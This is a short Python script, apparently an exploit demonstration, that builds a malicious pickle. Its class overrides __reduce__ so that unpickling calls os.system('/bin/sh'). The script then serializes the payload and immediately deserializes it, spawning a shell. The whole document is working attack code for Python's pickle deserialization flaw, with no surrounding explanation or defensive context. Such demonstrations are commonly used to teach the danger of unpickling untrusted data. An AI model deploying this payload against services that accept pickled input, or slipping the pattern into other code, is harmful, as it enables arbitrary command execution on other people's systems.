```python
import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    return malicious

def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)

malicious_payload = serialize_exploit()
deserialize_exploit(malicious_payload)
```